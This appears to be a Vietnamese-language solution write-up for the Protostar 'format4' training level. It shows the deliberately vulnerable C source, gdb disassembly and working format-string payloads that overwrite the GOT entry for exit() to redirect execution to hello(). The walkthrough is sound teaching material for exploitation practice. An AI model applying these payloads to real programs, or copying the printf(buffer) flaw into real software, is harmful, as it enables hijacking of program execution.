# FORMAT FOUR

## About

format4 looks at one method of redirecting execution in a process.

Hints:

  * objdump -TR is your friend

This level is at /opt/protostar/bin/format4

## Source code

```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);  
}

int main(int argc, char **argv)
{
  vuln();
}
```

## Solutions

`FORMAT FOUR` cho chúng ta thấy được khi overwrite everywhere sử dụng format string được ghi vào những vị trí chuyển hướng thực thi trong chương trình sẽ giúp chúng ta điều khiển luồng thực thi chương trình thực thi theo ý ta muốn.

Thử thách này hoàn thành khi ta in ra được dòng chữ `"code execution redirected! you win"` nhưng lại không hề có điều kiện hay chỗ nào gọi đến hàm `hello()` trong hai hàm mà chương trình sẽ thực thi là `main()` và  `vuln()`.

Ý tưởng của bài này là sẽ ghi đè địa chỉ hàm `hello()` lên địa chỉ của hàm `exit(1)` được lưu trong `GOT - Global Offset Table` để khi thoát hàm `vuln()` chương trình sẽ chuyển hướng thực thi tới `hello()` thay vì gọi hàm `exit(1)` và thoát chương trình.

Input chương trình bắt đầu ở parameter thứ 4.

```
root@protostar:/opt/protostar/bin# ./format4
AAAA %p %p %p %p %p %p
AAAA 0x200 0xb7fd8420 0xbffffb04 0x414141c3 0x70252041 0x20702520
```

Địa chỉ hàm `hello()` = 0x80484b4.

```
root@protostar:/opt/protostar/bin# gdb -q ./format4
Reading symbols from /opt/protostar/bin/format4...done.
(gdb) set disassembly-flavor intel
(gdb) p hello
$1 = {void (void)} 0x80484b4 <hello>
```

Tiếp theo là địa chỉ trong `GOT` nơi chứa địa chỉ của `exit(1)`. Bạn có thể đọc hiểu rõ hơn về `GOT` và `PLT` ở tài liệu tôi để ở `Documents`. 

```
(gdb) disass vuln
Dump of assembler code for function vuln:
0x080484d2 <vuln+0>:    push   ebp
0x080484d3 <vuln+1>:    mov    ebp,esp
0x080484d5 <vuln+3>:    sub    esp,0x218
0x080484db <vuln+9>:    mov    eax,ds:0x8049730
0x080484e0 <vuln+14>:   mov    DWORD PTR [esp+0x8],eax
0x080484e4 <vuln+18>:   mov    DWORD PTR [esp+0x4],0x200
0x080484ec <vuln+26>:   lea    eax,[ebp-0x208]
0x080484f2 <vuln+32>:   mov    DWORD PTR [esp],eax
0x080484f5 <vuln+35>:   call   0x804839c <fgets@plt>
0x080484fa <vuln+40>:   lea    eax,[ebp-0x208]
0x08048500 <vuln+46>:   mov    DWORD PTR [esp],eax
0x08048503 <vuln+49>:   call   0x80483cc <printf@plt>
0x08048508 <vuln+54>:   mov    DWORD PTR [esp],0x1
0x0804850f <vuln+61>:   call   0x80483ec <exit@plt>
End of assembler dump.
(gdb) x/2i 0x80483ec
0x80483ec <exit@plt>:   jmp    DWORD PTR ds:0x8049724
0x80483f2 <exit@plt+6>: push   0x30
(gdb)
```

Vậy là địa chỉ `GOT của exit(1)` = 0x8049724.

```
                 1      2      3
hex     | \xb4 | \x84 | \x04 | \x08 |
decimal | 180  |  388 |  516 |  776 |
Đã có   |  16  |  180 | 388  |  516 |
Cần     |  164 | 208  | 128  | 260  |
para    |  4   |  5   |  6   |   7  |
Addr:
0x80497xx| 24  | 25   | 26   |  27  |

```

Tiến hành khai thác:

```
root@protostar:/opt/protostar/bin# python -c 'print "\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08\x27\x97\x04\x08" + "%164x" + "%4$n" + "%208x" + "%5$n" + "%128x" + "%6$n" + "%260x" + "%7$n"' | ./format4
$%&'                                                                                                                                                                 200                                                                                                                                                                                                        b7fd8420                                                                                                                        bffffb04                                                                                                                                                                                                                                                             8049724
code execution redirected! you win
```

Cách điền `hn-hn` bạn có thể tự viết nó khi đã nắm vững hơn cách overwrite everywhere bằng format strings.

```
python -c 'print "\x24\x97\x04\x08\x26\x97\x04\x08" + "%" + str(0x84b4 - 8) + "x%4$hn" + "%" + str(0x10804 - 0x84b4) + "x%5$hn"' | ./format4
```

## Documents

Bạn có thể đọc phần Format String của cuốn này: <https://whitehat.vn/attachments/nghe-thuat-tan-dung-loi-phan-mem-pdf.1430/>

<https://www.exploit-db.com/papers/13203>



